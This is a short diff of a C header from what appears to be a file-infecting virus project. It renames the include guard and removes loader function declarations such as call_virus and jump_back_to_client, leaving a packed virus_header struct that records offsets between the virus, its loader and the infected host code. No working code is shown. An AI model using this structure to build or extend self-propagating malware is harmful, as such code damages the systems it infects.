@@ -1,15 +1,10 @@
 
-#ifndef LOADER_H
-# define LOADER_H
+#ifndef VIRUS_HEADER_H
+# define VIRUS_HEADER_H
 
-# include <stdbool.h>
 # include <stdint.h>
 # include <stddef.h>
 # include <sys/types.h>
-
-/*
-** the virus header and its position in the loader's code
-*/
 
 struct			virus_header
 {
@@ -22,16 +17,5 @@ struct			virus_header
 	size_t		dist_header_loader;
 	size_t		dist_client_loader;
 }__attribute__((packed));
-
-void		virus_header_struct(void);
-
-/*
-** loader
-*/
-
-void		loader_entry(void);
-void		call_virus(void);
-void		jump_back_to_client(void);
-void		loader_exit(void);
 
 #endif
